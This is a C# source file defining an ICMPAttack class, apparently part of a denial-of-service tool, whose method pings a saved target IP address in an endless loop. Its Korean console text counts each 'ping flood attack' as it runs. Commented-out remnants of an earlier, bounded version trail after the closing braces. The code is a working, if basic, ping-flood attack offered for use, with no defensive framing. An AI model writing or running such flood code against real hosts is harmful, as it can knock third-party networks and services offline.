using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace Sevz.Services
{
    class ICMPAttack
    {
        public static void ICMP()
        {
            // Target IP address or hostname
            string target = SetIP.GetSavedIp();

            // Create a new Ping instance
            Ping pingSender = new Ping();

            // Buffer size for ICMP packet
            byte[] buffer = new byte[32]; // Default size of 32 bytes
            PingOptions options = new PingOptions();

            int pingcount = 0;
            bool isFirstPing = true;

            while (true)
            {
                try
                {
                    pingcount++;
                    Console.Write($"\r{pingcount}번째 ping flood 공격 실행 중...");

                    if (isFirstPing)
                    {
                        PingReply reply = pingSender.Send(target, 1000, buffer, options);

                        if (reply.Status == IPStatus.Success)
                        {
                            Console.WriteLine("Reply from {0}: bytes={1} time={2}ms TTL={3}",
                                reply.Address, reply.Buffer.Length, reply.RoundtripTime, reply.Options.Ttl);
                        }
                        else
                        {
                            Console.WriteLine("Ping failed: {0}", reply.Status);
                        }

                        // 최초 응답 확인 완료 후 플래그 설정
                        isFirstPing = false;
                    }
                    else
                    {
                        pingSender.Send(target, 1000, buffer, options);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex.Message);
                }
            }
        }
    }
}                   // Loop for sending continuous ICMP echo requests (simulating a basic flood)
                     //for (int i = 0; i < 100; i++) // You can increase this number
                     //{
                     //    // Send ICMP echo request
                     //    PingReply reply = pingSender.Send(target, 1000, buffer, options);

    //    // Check if the target responded
    //    if (reply.Status == IPStatus.Success)
    //    {
    //        Console.WriteLine("Reply from {0}: bytes={1} time={2}ms TTL={3}",
    //            reply.Address, reply.Buffer.Length, reply.RoundtripTime, reply.Options.Ttl);
    //    }
    //    else
    //    {
    //        Console.WriteLine("Ping failed: {0}", reply.Status);
    //    }
    //}

